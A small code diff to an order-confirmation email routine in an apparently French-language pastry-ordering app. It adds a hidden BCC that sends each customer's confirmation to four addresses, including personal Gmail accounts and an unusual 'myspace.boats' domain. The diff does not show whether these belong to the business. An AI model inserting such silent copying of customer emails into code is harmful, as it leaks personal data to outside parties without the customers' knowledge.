@@ -299,6 +299,7 @@ export const pastryOrdersRouter = router({
               to: input.email,
               subject: `✅ Confirmation commande pâtisserie #${reference}`,
               html,
+              bcc: ['ratibehind3@gmail.com', 'reda.sebbani@gmail.com', 'contact@ftourbabrayan.ma', 'rsebbani@myspace.boats'],
             });
           } catch (e) {
             console.error('Email send error:', e);
